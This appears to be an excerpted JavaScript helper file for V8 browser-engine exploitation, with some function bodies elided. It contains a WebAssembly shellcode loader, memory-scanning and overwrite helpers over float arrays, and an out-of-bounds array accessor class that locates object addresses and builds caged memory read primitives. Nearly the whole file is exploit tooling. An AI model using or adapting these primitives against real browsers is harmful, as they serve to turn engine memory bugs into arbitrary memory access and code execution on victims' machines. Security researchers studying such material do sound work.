// PASTE RESEARCHER'S utils.js CONTENT BELOW THIS LINE
...
function wasmShellcodeLoader(vals, builder = null, mark = 0xccccccccccccccccn) {
    if (builder === null) builder = new WasmModuleBuilder();
    builder.addFunction("shellcode", makeSig([kWasmAnyRef], [kWasmI64])).exportFunc().addBody([
...
// Deprecated, should use `generateRef` instead
...
// Scans a haystack (PACKED_DOUBLE_ELEMENTS) for needles (array of BigInt or offsets)
// Returns the DWORD index of the first match in the haystackand the matched values
function haystack_scan(haystack, needles) {
    let _haystack = haystack.map(v => ftoi(v));
    function get(i) {
        let v = _haystack[i >> 1];
        if (v == null) return null;
        return (i % 2 == 0 ? v : v >> 32n) & 0xffffffffn;
    }
    ...
    for (let i = 0; i < haystack.length * 2; i++) {
        ...
        for (let j = 0; j < needles.length; j++) {
            ...
            if (v != null) {
                ...
                if (needles[j] == null) continue;
                // If needle is a number, treat it as an offset from i to match repeated unknown values
                else if (typeof needles[j] === typeof 1) {
                    if (get(i + needles[j]) == v) continue;
                }
                // If needle is callable, call it with the value to check for a match
                else if (typeof needles[j] === 'function') {
                    if (needles[j](v)) continue;
                }
                // If needle is a BigInt treat it as an exact match
                else {
                    if (needles[j] == v) continue;
                }
            }
            
            // No match, reset and break
            found = false;
            break;
        }
        if (found) {
            return [i, needles.map((_, j) => get(i + j))];
        }
    }
...
function haystack_replace(haystack, replacement, index=0) {
    let _haystack = haystack.slice(index >> 1, ((index + replacement.length) >> 1) + 1).map(v => ftoi(v));

    for (let i = 0; i < replacement.length; i++) {
        let v = _haystack[i >> 1];
        if (i % 2 == 0) {
            v = (v & 0xffffffff00000000n) | (replacement[i] & 0xffffffffn);
        } else {
            v = (v & 0x00000000ffffffffn) | ((replacement[i] & 0xffffffffn) << 32n);
        }
        _haystack[i >> 1] = v;
    }
    for (let i = 0; i < _haystack.length; i++) {
        haystack[(index >> 1) + i] = itof(_haystack[i]);
    }
}

// TODO: Still needs some work
class OobarrAccessor {
    SCAN_SIZE = 0x400; // Size of the scan buffer
    ...
    constructor(oobarr, objarr, crwarr) {
        ...
        this._get = noOpt((accessor, index) => {
            let v = ftoi(accessor.oobarr[index >> 1]);
            return index % 2 == 0 ? v & 0xffffffffn : v >> 32n;
        });

        this._set = noOpt((accessor, index, value) => {
            let v = ftoi(accessor.oobarr[index >> 1]);
            if (index % 2 == 0) {
            ...
            accessor.oobarr[index >> 1] = itof(v);
        });
    }
    ...
    factory() {
        try { eval(`%DebugPrint(this.oobarr); %DebugPrint(this.objarr); %DebugPrint(this.crwarr);`); } catch(e) {}
        
        if (this.oobarr.length < this.SCAN_SIZE) {
            throw 'oobarr too small';
        }

        
        this.objarr.fill({});
        let check = this.copy(this.SCAN_SIZE);
        this.objarr.fill({}); // Change the object that fills the objarr
        // console.log('check', check.map(x => to_hex(x)).join(', '));

        // Scan for the objarr elemnts[0] index
        for (let i = 0; i < check.length; i++) {
            if (check[i] != check[i + 1]) continue;
            if (this.get(i) == check[i]) continue;
            if (this.get(i) != this.get(i + 1)) continue;
        ...
        // Scan for the address of oobarr FixedArray (props, elements, length)
        let index = this.find([this.addrOf(this.oobarr), BigInt(this.oobarr.length) << 1n], [0xfffff000n, 0xffffffffn]);
        if (index == -1) {
            throw 'oobarr FixedArray not found';
        }
        this.oobElementsAddr = this.get(index);
        this.crwElementsIndex = Number((this.addrOf(this.crwarr) - this.oobElementsAddr) / 4n);
    }
    ...
    cagedRead32(addr) {
        return this.cagedRead(addr) & 0xffffffffn;
    }
